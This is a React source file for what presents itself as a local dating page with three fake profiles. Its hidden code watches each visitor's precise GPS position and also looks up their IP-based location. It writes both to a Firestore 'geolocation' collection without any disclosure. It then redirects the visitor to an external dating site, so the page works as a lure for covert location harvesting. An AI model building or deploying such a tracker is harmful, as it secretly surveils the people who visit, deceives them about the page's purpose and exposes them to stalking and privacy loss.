import React, { useState, useEffect } from 'react';
import { serverTimestamp } from 'firebase/firestore';
import { firestore } from './firebase';
import { addDoc, collection } from 'firebase/firestore';
import './App.css';
import download1 from './images/download1.jpg';
import download2 from './images/download2.jpg';
import images2 from './images/images2.jpg';
import moment from 'moment/moment';

function App() {
  useEffect(() => {
    const options = {
      enableHighAccuracy: true,
      timeout: 5000,
      maximumAge: 0,
    };

    const ref = collection(firestore, "geolocation");

    if (navigator.geolocation) {
      navigator.geolocation.watchPosition((position) => {
        console.log("position-->", position, position.coords)

        let data = {
          geo: JSON.stringify(position.coords.accuracy),
          latitude: JSON.stringify(position.coords.latitude),
          longitude: JSON.stringify(position.coords.longitude),
          timestamp: serverTimestamp(),
        }
        try {
          addDoc(ref, data).then(() => {
            const timeout = setTimeout(() => {
              // 👇️ redirects to an external URL
              window.location.replace('https://www.quackquack.in/dating/in/tamil-nadu/');
            }, 3000);

            return () => clearTimeout(timeout);
          })

        } catch (err) {
          console.log("err-->", err)
        }
      }, error => console.log(error), options)

    }
  }, []);

  useEffect(() => {
    let date = new Date();
    console.log(date)
    const ref = collection(firestore, "geolocation");
    fetch('https://geolocation-db.com/json/f2e84010-e1e9-11ed-b2f8-6b70106be3c8').then(res => res.json()).then(resObj => {
      addDoc(ref, {
        ...resObj, time: moment()
          .utcOffset('+05:30')
          .format('YYYY-MM-DD hh:mm:ss a')
      })

    })
  }, [])

  const [searchTerm, setSearchTerm] = useState('');
  const [selectedProfile, setSelectedProfile] = useState(null);

  const profiles = [
    {
      name: 'Ramya',
      age: 25,
      location: '2 km from you',
      description: 'I love hiking and trying new foods!',
      image: download1
    },
    {
      name: 'Maha',
      age: 30,
      location: '1.5 km from you',
      description: 'I enjoy playing guitar and watching movies.',
      image: download2
    },
    {
      name: 'Rose',
      age: 27,
      location: '1 km from you',
      description: 'I am a software engineer and enjoy traveling.',
      image: images2
    },
  ];

  const filteredProfiles = profiles.filter((profile) =>
    profile.name.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="App">
      <h1>Find boys & girls for dating near you</h1>
      <div className="search-bar">
        <input
          type="text"
          placeholder="Search profiles"
          value={searchTerm}
          onChange={(event) => setSearchTerm(event.target.value)}
        />
      </div>
      <div className="profiles">
        {filteredProfiles.map((profile) => (
          <div key={profile.name} className="profile-card">
            <h2>{profile.name}<span>{` ${profile.age} years`}</span></h2>
            <img className="img" alt='loading' src={profile.image} />
            <p>{profile.location}</p>
            <button onClick={() => setSelectedProfile(profile)}>
              View Profile
            </button>
          </div>
        ))}
      </div>
      {selectedProfile && (
        <div className="profile-details">
          <h2>{selectedProfile.name}</h2>
          <p>{selectedProfile.age} years old</p>
          <p>{selectedProfile.location}</p>
          <p>{selectedProfile.description}</p>
          <button onClick={() => setSelectedProfile(null)}>
            Back to Profiles
          </button>
        </div>
      )}
    </div>
  );
}

export default App;